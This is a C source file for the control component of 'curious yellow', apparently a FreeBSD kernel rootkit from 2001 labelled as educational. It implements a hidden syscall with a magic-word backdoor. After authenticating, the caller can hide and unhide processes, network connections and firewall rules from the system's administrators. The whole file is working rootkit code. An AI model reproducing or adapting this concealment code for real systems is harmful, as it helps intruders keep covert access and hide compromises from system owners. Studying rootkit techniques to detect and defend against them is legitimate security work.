/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    $Id: control.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 *
 *    This file contains a the functions to control the behaviour of 
 *    curious yellow.
 *
 *    This software was written for educational purposes only. 
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <machine/limits.h>
#include <sys/malloc.h>
#include <sys/queue.h>

#include "../config.h"

#include "util.h"
#include "control.h"
#include "fw.h"

MALLOC_DEFINE(M_HID_CON,"conn","Hidden connections");

uid_t magic_uid = ULONG_MAX;
int hidden_cons = 0;

LIST_HEAD(head_conn, list_conn) lh_conn;

/*
 *    Initialize control. eg by initalizing the list of hidden connections
 */

int
control_init(void)
{
    LIST_INIT(&lh_conn);

    return(0);
}

/*
 *    syscall to control the module
 */

int 
cy_ctl(struct proc *p,struct cy_ctl_args *uap)
{
    char magic[21];
    pid_t pid;
    u_short numrule;
    struct proc *process;
    struct list_conn *l_conn, entry;
    void *ptr;
    int size = 0;
    int error = 0;

    switch(uap->cmd) {

        case MOD_ENTER:

            /* get the magic string */
            error = copyinstr(uap->data, &magic, 20, &size);
            if(error == EFAULT)
                return(error);

            /* check if access should be granted */
            if(strcmp(magic,MAGICWORD))
                return(EACCES);

            /* set the magic uid, to the uid of the caller */
            magic_uid = p->p_cred->pc_ucred->cr_uid;

            break;

        case MOD_LEAVE:

            /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid)) 
                return(EACCES);
           
            /* reset the magic uid */ 
            magic_uid = ULONG_MAX;
            break;

        case MOD_PROC_HIDE: 

            /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid)) 
                return(EACCES);

            /* get the user supplied pid */
            error = copyin(uap->data, &pid, sizeof(pid_t));
            if(error == EFAULT)
                return(error);

            /* find process with given pid */
            if((process = pfind(pid)) == NULL)
                return(ESRCH);

            /* set hidden flag */
                process->p_flag |= P_HIDDEN;

                break;

        case MOD_PROC_UNHIDE:

            /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid)) 
                return(EACCES);

            /* get the user supplied pid */
            error = copyin(uap->data, &pid, sizeof(pid_t));
            if(error == EFAULT)
                return(error);

            /* find process with given pid */
            if((process = pfind(pid)) == NULL)
                return(ESRCH);

            /* unset hidden flag */
            process->p_flag &= ~(P_HIDDEN);

            break;

	case MOD_NET_HIDE:

            /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid)) 
                return(EACCES);

            /* check if there's more to hide */
            if(hidden_cons >= MAX_NET) 
                return(ENOBUFS);

	    /* allocate a new list entry */
	    MALLOC(l_conn, struct list_conn *, sizeof(struct list_conn), M_HID_CON,M_NOWAIT);
	    if(l_conn == NULL) 
	        return(ENOMEM);

	    copyin(uap->data,l_conn,sizeof(struct connection));

            /* add this entry to the list */
	    LIST_INSERT_HEAD(&lh_conn, l_conn, list);

            hidden_cons++;

	    break;

        case MOD_NET_UNHIDE:

            /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid)) 
                return(EACCES);

            /* get the given entry */
	    copyin(uap->data,&entry,sizeof(struct connection));

            /* find the given entry and delete it */

            LIST_FOREACH(l_conn, &lh_conn, list) {

		if(((l_conn->conn.l_ip == entry.conn.l_ip) || (l_conn->conn.l_ip == 0)) &&
	  	   ((l_conn->conn.l_port == entry.conn.l_port) || (l_conn->conn.l_port == 0)) && 
		   ((l_conn->conn.r_ip == entry.conn.r_ip) || (l_conn->conn.r_ip == 0)) && 
		   ((l_conn->conn.r_port == entry.conn.r_port) || (l_conn->conn.r_port == 0))) {

                    /* l_conn found */
                    LIST_REMOVE(l_conn, list); 
                    FREE(l_conn, M_HID_CON);
                    hidden_cons--;

                    return(error);
                    
                }
            }

            return(ESRCH);

        case MOD_NET_VIEW:

            /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid)) 
                return(EACCES);

            ptr = uap->data;

            LIST_FOREACH(l_conn, &lh_conn, list) {
                copyout(&(l_conn->conn), ptr, sizeof(struct connection));

                ptr = (char *)ptr + sizeof(struct connection);
            }
                

            break;

	case MOD_HIDE_FW:

	    /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid))
                return(EACCES);

            /* get the user supplied pid */
            error = copyin(uap->data, &numrule, sizeof(u_short));
            if(error == EFAULT)
                return(error);

            /* hide this entry */
            error = hide_rule(numrule);

            break;

        case MOD_UNHIDE_FW:

	    /* check if user got magic */
            if(!is_magic_user(p->p_cred->pc_ucred->cr_uid))
                return(EACCES);

            /* get the user supplied pid */
            error = copyin(uap->data, &numrule, sizeof(u_short));
            if(error == EFAULT)
                return(error);

            /* unhide this entry */
            error = unhide_rule(numrule);

            break;

        default:
            error = EINVAL;
    }

    return(error);

}

